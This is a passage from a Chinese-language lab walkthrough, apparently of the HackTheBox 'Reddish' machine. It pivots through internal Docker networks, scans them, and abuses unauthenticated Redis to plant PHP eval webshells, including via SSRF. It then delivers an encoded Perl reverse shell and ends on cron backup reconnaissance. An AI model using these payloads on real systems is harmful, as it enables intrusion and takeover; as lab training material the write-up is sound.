class="number">0.3</span></span><br><span class="line"><span class="number">172.19</span>.<span class="number">0.2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看当前目录，发现有个portscan.sh</p><p>直接执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./portscan.sh</span></span><br><span class="line">tput: No value <span class="keyword">for</span> <span class="variable">$TERM</span> and no <span class="literal">-T</span> specified</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.18</span>.<span class="number">0.1</span>:</span><br><span class="line">[+] Port <span class="number">1880</span> - OPEN</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.18</span>.<span class="number">0.2</span>:</span><br><span class="line">[+] Port <span class="number">1111</span> - OPEN</span><br><span class="line">[+] Port <span class="number">1880</span> - OPEN</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.19</span>.<span class="number">0.1</span>:</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.19</span>.<span class="number">0.2</span>:</span><br><span class="line">[+] Port <span class="number">6379</span> - OPEN</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.19</span>.<span class="number">0.3</span>:</span><br><span class="line">[+] Port <span class="number">80</span> - OPEN</span><br><span class="line"></span><br><span class="line">[+] Enumerando Puertos para el host <span class="number">172.19</span>.<span class="number">0.4</span>:</span><br><span class="line">[+] Port <span class="number">1111</span> - OPEN</span><br><span class="line">[+] Port <span class="number">1880</span> - OPEN</span><br><span class="line">tput: No value <span class="keyword">for</span> <span class="variable">$TERM</span> and no <span class="literal">-T</span> specified</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描出这些端口</p><h4 id="恶劣环境（上传编译后的二进制工具）"><a href="#恶劣环境（上传编译后的二进制工具）" class="headerlink" title="恶劣环境（上传编译后的二进制工具）"></a>恶劣环境（上传编译后的二进制工具）</h4><p>我看了wp，发现他们并没有上传文件这个痛苦，应该是靶机被改了，我们直接重启</p><p>直接开启web服务 传个编译好的rustscan上去</p><p>原来的确就是存在这个问题，但是我之前没遇到过，这里贴另一个佬的wp</p><p><a href="https://www.cnblogs.com/autopwn/p/14120180.html">https://www.cnblogs.com/autopwn/p/14120180.html</a></p><p><font style="color:rgb(0, 0, 0);">通过上述环境得到的IP地址，探测一下存活主机和开放的端口，使用了for循环探测和nmap的静态二进制文件</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker环境下命令很少，使用循环ping探测存活主机</span><br><span class="line">for i in $(seq 1 20); do (ping -c 1 172.18.0.$i | grep &quot;bytes from&quot;); done</span><br><span class="line">for i in $(seq 1 20); do (ping -c 1 172.19.0.$i | grep &quot;bytes from&quot;); done</span><br><span class="line"></span><br><span class="line">一般在目标环境恶劣的情况下，不方便安装和编译软件可以使用静态的二进制文件进行完成下一步工作</span><br><span class="line"></span><br><span class="line">以下是部分编译好的静态二进制文件</span><br><span class="line">https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">将下载好本地kali的文件传到目标靶机，看如下操作</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">在目标靶机上没有nc命令的情况下使用nc传文件操作</span><br><span class="line"></span><br><span class="line">本地kali操作</span><br><span class="line">1.准备好要复制的静态二进制文件nmap</span><br><span class="line">2.准备好/etc/services文件</span><br><span class="line">3.本地nc监听端口并带入标准输入重定向指定要传输的文件</span><br><span class="line">nc -lvnp 5555 &lt; nmap</span><br><span class="line">nc -lvnp 5555 &lt; services</span><br><span class="line"></span><br><span class="line">目标靶机操作</span><br><span class="line">执行之前可以通过md5sum比对传输前后的md5值确认文件传输过程未损坏</span><br><span class="line">1.bash -c &quot;cat &lt; /dev/tcp/10.10.14.6/5555 &gt; nmap&quot;</span><br><span class="line">2.bash -c &quot;cat &lt; /dev/tcp/10.10.14.6/5555 &gt; services&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#本地</span><br><span class="line">nc -lvnp 5555 &lt; rustscan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#靶机</span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/10.10.16.38/5555 &gt; rustscan&quot;</span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/10.10.16.38/5555 &gt; services&quot;</span><br><span class="line"></span><br><span class="line">mv services /etc/services</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/21.png"></p><p><img src="/img/reddish/22.png"></p><p><img src="/img/reddish/23.png"></p><p>那边卡住了，我们重新反弹一个shell来并使用md5sum查看是否上传完整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root?kali)-[/home/kali/red/Rustscan]</span><br><span class="line">└─# md5sum rustscan      </span><br><span class="line">befc71c3be8d2b5238d797d8622e402c  rustscan</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整，那么我们需要将前面的传输断掉，不然会显示文件被占用</p><p><font style="color:rgb(0, 0, 0);">再次进行端口扫描</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x ./rustscan</span><br><span class="line"># ./rustscan -a 172.19.0.3</span><br><span class="line">/bin/sh: 6: ./rustscan: Text file busy</span><br><span class="line"># ./rustscan -a 172.19.0.3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现还是扫不成功，还是传nmap和&#x2F;etc&#x2F;services扫吧，不然会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &lt; nmap</span><br><span class="line"></span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/10.10.16.38/5555 &gt; nmap&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/red]</span><br><span class="line">└─# md5sum nmap        </span><br><span class="line">99d1b866c3eb7dd11a84829abb5a6758  nmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># md5sum nmap </span><br><span class="line">99d1b866c3eb7dd11a84829abb5a6758  nmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);">接下来主要是对</font></p><p><font style="color:rgb(0, 0, 0);">172.19.0.3</font></p><p><font style="color:rgb(0, 0, 0);">172.19.0.2</font></p><p><font style="color:rgb(0, 0, 0);">172.19.0.1</font></p><p><font style="color:rgb(106, 153, 85);background-color:rgb(31, 31, 31);"></font></p><p><font style="color:rgb(0, 0, 0);">进行探测</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">chmod +x nmap</span><br><span class="line">./nmap -p- -sT --min-rate 5000 172.19.0.3</span><br><span class="line">./nmap -p- -sT --min-rate 5000 172.19.0.2</span><br><span class="line">./nmap -p- -sT --min-rate 5000 172.19.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mv services /etc/services</span><br><span class="line"># ./nmap -p- -sT --min-rate 5000 172.19.0.3</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-05-31 10:00 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report for reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000078s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 02:42:AC:13:00:03 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds</span><br><span class="line"></span><br><span class="line"># ./nmap -p- -sT --min-rate 5000 172.19.0.2</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-05-31 10:00 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report for reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000079s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line">MAC Address: 02:42:AC:13:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ./nmap -p- -sT --min-rate 5000 172.19.0.1</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-05-31 10:01 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report for 172.19.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000070s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1880/tcp filtered unknown</span><br><span class="line">MAC Address: 02:42:2D:25:9A:D2 (Unknown)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);">扫描出来了开放了172.19.0.3的端口80和172.19.0.2的6379</font></p><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);">那么我们先挂载代理吧</font></p><p><font style="color:rgb(0, 0, 0);">上传stowaway客户端</font></p><p><font style="color:rgb(0, 0, 0);">还是一样的</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &lt; linux_x64_agent</span><br><span class="line"></span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/10.10.16.38/5555 &gt; linux_x64_agent&quot;</span><br><span class="line"></span><br><span class="line">#本地</span><br><span class="line">./linux_x64_admin -l 1122</span><br><span class="line"></span><br><span class="line">chmod +x linux_x64_agent</span><br><span class="line">./linux_x64_agent -c 10.10.16.38:1122</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/24.png"></p><p><img src="/img/reddish/25.png"></p><p>配置好<a href="https://www.c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E3%80%90%E4%BB%A3%E7%90%86%E3%80%91proxychains.html#_0"><font style="color:rgb(119, 223, 202) !important;">proxychains</font></a><font style="color:rgb(119, 223, 202) !important;">和火狐浏览器</font></p><p><font style="color:rgb(119, 223, 202) !important;"></font></p><p><img src="/img/reddish/26.png"></p><p>火狐需要更新到最新版本</p><p><img src="/img/reddish/27.png"></p><p><img src="/img/reddish/28.png"></p><p>现在我们就可以访问到内网了</p><p><img src="/img/reddish/29.png"></p><p><img src="/img/reddish/30.png"></p><p>提示我们这个网站目录与redis数据库的目录是共享的，并且目录的url是 <code>/f187a0ec71ce99642e4f0afbd441a68b</code></p><p>所以我们需要尝试打一下redis</p><p>直接使用redis-cli试试有没有未授权</p><p>在kali安装一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root?kali)-[~]</span><br><span class="line">└─# proxychains4 -q redis-cli -h 172.19.0.2</span><br><span class="line">172.19.0.2:6379&gt; info</span><br><span class="line"># Server</span><br><span class="line">redis_version:4.0.9</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:cce7cc41d26597f7</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 4.15.0-213-generic x86_64</span><br><span class="line">arch_bits:64</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:atomic-builtin</span><br><span class="line">gcc_version:6.4.0</span><br><span class="line">process_id:7</span><br><span class="line">run_id:f5a494521dd3ee6f4f76d460e202a334f3486795</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:5722</span><br><span class="line">uptime_in_days:0</span><br><span class="line">hz:10</span><br><span class="line">lru_clock:3857241</span><br><span class="line">executable:/data/redis-server</span><br><span class="line">config_file:</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/reddish/31.png"></p><p>这是一个比较老的版本，4.0.9</p><p><img src="/img/reddish/32.png"></p><p>我们有很多方法可以getshell</p><p>这里 我想手搓尝试一下怎么写webshell的，就跟着大佬走了</p><p>这个版本好像还可以直接用脚本打</p><p><strong>Redis-Rogue-Server</strong> ➔ 就是<strong>伪造一个假的 Redis 服务器</strong>，骗目标 Redis 客户端来<strong>自动执行命令</strong></p><hr><p>并且有个目录是共享的，我们选择直接写webshell到那个目录，直接getshell两台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php eval($_POST[&#x27;a&#x27;]); phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">172.19.0.2:6379&gt; flushall</span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">172.19.0.2:6379&gt; config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">OK</span><br><span class="line">172.19.0.2:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">172.19.0.2:6379&gt; set x &quot;&lt;?php eval($_POST[&#x27;a&#x27;]); phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">172.19.0.2:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/img/reddish/33.png"></p><p>前面的源码还给了几个api接口，看起来可以ssrf</p><p>我想打一下ssrf+redis未授权</p><p><img src="/img/reddish/34.png"></p><p>的确成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q curl http://172.19.0.3/8924d0549008565c554f8128cd11fda4/ajax.php?test=set shell &quot;&lt;?php echo @eval($_POST[x]); ?&gt;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q curl http://172.19.0.3/8924d0549008565c554f8128cd11fda4/ajax.php?test=set%20shell%20%22%3C%3Fphp%20echo%20%40eval%28%24_POST%5Bx%5D%29%3B%20%3F%3E%22</span><br></pre></td></tr></table></figure><p>的确能成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                              </span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/Rustscan]</span><br><span class="line">└─# proxychains4 -q curl http://172.19.0.3/8924d0549008565c554f8128cd11fda4/ajax.php?test=set%20shell%20%22%3C%3Fphp%20echo%20%40eval%28%24_POST%5Bx%5D%29%3B%20%3F%3E%22</span><br><span class="line">OK                  </span><br></pre></td></tr></table></figure><p><img src="/img/reddish/35.png"></p><p>webshell每隔几分钟就会被删除</p><p>我们写个脚本一直写</p><p><img src="/img/reddish/36.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 flushall</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 config set dbfilename shell.php</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 SET shell &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); phpinfo(); ?&gt;&quot;</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 save</span><br></pre></td></tr></table></figure><p>好复杂</p><p>只能按着佬的wp做</p><p><img src="/img/reddish/37.png"></p><ul><li>用socat把 入口机的端口转发到你kali的监听端口。<br>然后你需要用Perl的bind shell 对他进行 base64 然后再urlencode 才能反弹成功</li><li>另一种思路<ul><li>上传ncat 在入口机进行监听</li><li>反弹shell到入口机</li><li>这样就不用使用pwncat里的socat进行端口转发了</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &lt; ncat</span><br><span class="line">bash -c &quot;cat &lt; /dev/tcp/10.10.16.38/5555 &gt; ncat&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/38.png"></p><p>本机为172.19.0.4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#先是perl的bind shell </span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;172.19.0.4&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line"># base64 </span><br><span class="line">echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzc3Nztzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCJzaCAtaSIpO307Jw== |base64 -d |sh</span><br><span class="line"></span><br><span class="line">#再url</span><br><span class="line">cmd=system(&#x27;echo%20cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzc3Nztzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI%2BJlMiKTtleGVjKCJzaCAtaSIpO307Jw%3D%3D%20%7Cbase64%20-d%20%7Csh&#x27;)</span><br><span class="line"></span><br><span class="line">./ncat -lvnp 7777</span><br></pre></td></tr></table></figure><p>但是这里一直反弹不回来</p><p><img src="/img/reddish/39.png"></p><p>换一种方式写webshell</p><p><img src="/img/reddish/40.png"></p><p><img src="/img/reddish/41.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 flushall</span><br><span class="line">proxychains4 -q cat x.php | proxychains4 -q redis-cli -h 172.19.0.2 -x set reverse</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 config set dbfilename &quot;x.php&quot;</span><br><span class="line">proxychains4 -q redis-cli -h 172.19.0.2 save</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/x.php?x=echo%20cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuNCI7JHA9Nzc3Nztzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI%2BJlMiKTtleGVjKCJzaCAtaSIpO307Jw%3D%3D%20%7Cbase64%20-d%20%7Csh</span><br></pre></td></tr></table></figure><p><img src="/img/reddish/42.png"></p><p>成功弹shell</p><p><img src="/img/reddish/43.png"></p><p>我们需要进到tmp目录进行读写操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;IyEvYmluL2Jhc2gKCklGUz0kJ1xuJwoKb2xkPSQocHMgLWVvIGNvbW1hbmQpCndoaWxlIHRydWU7IGRvCiAgICBuZXc9JChwcyAtZW8gY29tbWFuZCkKICAgIGRpZmYgPChlY2hvICIkb2xkIikgPChlY2hvICIkbmV3IikgfCBncmVwIFtcPFw+XQogICAgc2xlZXAgLjMKICAgIG9sZD0kbmV3CmRvbmUK&#x27; |base64 -d &gt;proc.sh</span><br><span class="line">sh: 21: cannot create proc.sh: Permission denied</span><br><span class="line">sh: echo: I/O error</span><br><span class="line">$ cd ../../</span><br><span class="line">$ cd /temp^H^H</span><br><span class="line">sh: 23: cd: can&#x27;t cd to /temp</span><br><span class="line">$ cd /tmp</span><br><span class="line">$ pwd</span><br><span class="line">/tmp</span><br><span class="line">$ echo &#x27;IyEvYmluL2Jhc2gKCklGUz0kJ1xuJwoKb2xkPSQocHMgLWVvIGNvbW1hbmQpCndoaWxlIHRydWU7IGRvCiAgICBuZXc9JChwcyAtZW8gY29tbWFuZCkKICAgIGRpZmYgPChlY2hvICIkb2xkIikgPChlY2hvICIkbmV3IikgfCBncmVwIFtcPFw+XQogICAgc2xlZXAgLjMKICAgIG9sZD0kbmV3CmRvbmUK&#x27; |base64 -d &gt;proc.sh</span><br><span class="line">$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们写一个脚本进行监听实时监控系统中正在运行的进程，并显示新出现或消失的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">IFS=$&#x27;\n&#x27;</span><br><span class="line">old=$(ps -eo command)</span><br><span class="line">while true; do</span><br><span class="line">    new=$(ps -eo command)</span><br><span class="line">    diff &lt;(echo &quot;$old&quot;) &lt;(echo &quot;$new&quot;) | grep [\&lt;\&gt;]</span><br><span class="line">    sleep .3</span><br><span class="line">    old=$new</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/tmp</span><br><span class="line">$ ls</span><br><span class="line">proc.sh</span><br><span class="line">$ chmod +x proc.sh</span><br><span class="line">$ ./proc.sh</span><br><span class="line">&gt; /usr/sbin/CRON</span><br><span class="line">&gt; /bin/sh -c sh /backup/backup.sh</span><br><span class="line">&gt; sh /backup/backup.sh</span><br><span class="line">&gt; rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line">&lt; /usr/sbin/CRON</span><br><span class="line">&lt; /bin/sh -c sh /backup/backup.sh</span><br><span class="line">&lt; sh /backup/backup.sh</span><br><span class="line">&lt; rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么我们可以读一下backup.sh的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cat /backup/backup.sh</span><br><span class="line">cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line">cd 